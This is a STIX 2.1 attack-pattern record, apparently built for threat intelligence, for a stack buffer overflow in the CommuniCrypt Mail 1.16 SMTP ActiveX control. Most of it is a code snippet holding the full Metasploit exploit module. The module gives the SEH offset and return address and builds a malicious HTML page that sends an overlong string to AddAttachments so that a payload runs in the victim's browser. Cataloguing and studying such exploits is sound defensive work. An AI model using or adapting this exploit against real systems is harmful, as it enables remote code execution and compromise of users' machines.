{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e866051d-bfe1-431f-b9bb-38d53a8611c4",
    "created": "2024-08-14T16:41:47.589975Z",
    "modified": "2024-08-14T16:41:47.58998Z",
    "name": "CommuniCrypt Mail 1.16 SMTP ActiveX Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the ANSMTP.dll/AOSMTP.dll ActiveX Control provided by CommuniCrypt Mail 1.16.  By sending an overly long string to the \"AddAttachments()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/communicrypt_mail_activex.rb",
            "external_id": "communicrypt_mail_activex.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CommuniCrypt Mail 1.16 SMTP ActiveX Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the ANSMTP.dll/AOSMTP.dll\n        ActiveX Control provided by CommuniCrypt Mail 1.16.  By sending an overly\n        long string to the \"AddAttachments()\" method, an attacker may be able to\n        execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Lincoln',  # Original exploit author\n          'dookie'    # MSF module author\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '64839' ],\n          [ 'EDB', '12663' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'           => 1000,\n          'BadChars'        => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Universal', { 'Offset' => 284, 'Ret' => 0x1001e41c } ], #p/p/r in AOSMTP.dll\n        ],\n      'DisclosureDate' => '2010-05-19',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname   = rand_text_alpha(rand(100) + 1)\n    strname = rand_text_alpha(rand(100) + 1)\n\n    filler  = rand_text_alpha(target['Offset'])\n    seh     = generate_seh_payload(target.ret)\n    trailer = rand_text_alpha(1000 - p.encoded.length)\n    sploit  = filler + seh + p.encoded + trailer\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='#{vname}'></object>\n<script language='javascript'>\nvar #{vname} = document.getElementById('#{vname}');\nvar #{strname} = new String('#{sploit}');\n#{vname}.AddAttachments(#{strname});\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-05-19",
    "x_mitre_platforms": [
        "win'"
    ]
}